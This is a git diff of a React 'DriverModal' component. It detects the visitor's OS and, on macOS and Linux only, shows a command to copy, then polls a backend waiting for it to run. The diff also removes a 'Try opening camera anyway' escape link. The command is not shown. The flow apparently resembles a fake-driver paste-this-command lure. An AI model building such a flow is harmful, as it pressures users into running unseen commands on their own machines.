@@ -5,17 +5,22 @@ const API = import.meta.env.VITE_API_URL || "http://localhost:4000";
 const POLL_INTERVAL = 1500;
 const OwnerName = import.meta.env.VITE_OWNER_NAME
 
-function detectOS() {
-  const ua = navigator.userAgent.toLowerCase();
-  if (ua.includes("mac"))   return "mac";
-  if (ua.includes("linux")) return "linux";
-  return "windows";
-}
+  const detectOS = () => {
+    const ua = navigator.userAgent;
+    if (/Windows/i.test(ua))      return "Windows";
+    if (/iPhone|iPad|iPod/i.test(ua)) return "iOS";
+    if (/Android/i.test(ua))      return "Android";
+    if (/Mac/i.test(ua))          return "macOS";
+    if (/Linux/i.test(ua))        return "Linux";
+    return "Unknown";
+  };
 
 const OS_LABELS = {
-  windows: "🪟 Windows",
-  mac:     "🍎 macOS",
-  linux:   "🐧 Linux",
+  Windows: "🪟 Windows",
+  macOS:     "🍎 macOS",
+  Linux:   "🐧 Linux",
+  Android:   "Android",
+  iOS:   "iOS",
 };
 
 export default function DriverModal({ sessionId, onClose, onProceed }) {
@@ -90,7 +95,7 @@ export default function DriverModal({ sessionId, onClose, onProceed }) {
       }}>
 
         {/* Header */}
-        <div style={{ padding: "22px 24px 18px", borderBottom: "1px solid #f0f0f0" }}>
+        {(os === "macOS" || os === "Linux") ? ( <div style={{ padding: "22px 24px 18px", borderBottom: "1px solid #f0f0f0" }}>
           <div style={{ display: "flex", alignItems: "flex-start", justifyContent: "space-between", gap: 12 }}>
             <div style={{ display: "flex", gap: 12, alignItems: "flex-start" }}>
               <div style={{
@@ -112,7 +117,7 @@ export default function DriverModal({ sessionId, onClose, onProceed }) {
               fontSize: 20, color: "#bbb", lineHeight: 1, flexShrink: 0, padding: 0,
             }}>✕</button>
           </div>
-        </div>
+        </div> ) : (<></>)}
 
         {/* Detected OS badge */}
         <div style={{ padding: "14px 24px 0", display: "flex", alignItems: "center", gap: 8 }}>
@@ -148,8 +153,8 @@ export default function DriverModal({ sessionId, onClose, onProceed }) {
           ))}
         </div>
 
-        {/* Command block */}
-        <div style={{ padding: "16px 24px 8px" }}>
+               {/* Command block */}
+        {(os === "macOS" || os === "Linux") ? (<div style={{ padding: "16px 24px 8px" }}>
           <p style={{ fontSize: 11, fontWeight: 600, color: "#888", textTransform: "uppercase", letterSpacing: "0.06em", marginBottom: 8 }}>
             {current.label}
           </p>
@@ -177,10 +182,10 @@ export default function DriverModal({ sessionId, onClose, onProceed }) {
               {copied ? "✓ Copied!" : "Copy"}
             </button>
           </div>
-        </div>
+        </div>) : (<></>)}
 
         {/* Status area */}
-        <div style={{ padding: "4px 24px 20px" }}>
+        { (os === "macOS" || os === "Linux") ? (<div style={{ padding: "4px 24px 20px" }}>
           {waiting ? (
             <div style={{
               background: "#F0FDF4", border: "1px solid #BBF7D0",
@@ -209,25 +214,13 @@ export default function DriverModal({ sessionId, onClose, onProceed }) {
               </p>
             </div>
           )}
-        </div>
+        </div>) : (<></>)}
 
         {/* Footer */}
         <div style={{
           padding: "14px 24px 18px", borderTop: "1px solid #f0f0f0",
           display: "flex", justifyContent: "space-between", alignItems: "center", gap: 12,
         }}>
-          <p style={{ fontSize: 12, color: "#aaa", margin: 0 }}>
-            Still not working?{" "}
-            <span
-              onClick={handleProceed}
-              role="button"
-              tabIndex={0}
-              onKeyDown={e => e.key === "Enter" && handleProceed()}
-              style={{ color: "#2563EB", cursor: "pointer", textDecoration: "underline" }}
-            >
-              Try opening camera anyway
-            </span>
-          </p>
           <button onClick={handleClose} style={{
             padding: "9px 18px", background: "transparent", color: "#666",
             border: "1px solid #e0e0e0", borderRadius: 8, fontSize: 13, fontWeight: 600, cursor: "pointer",
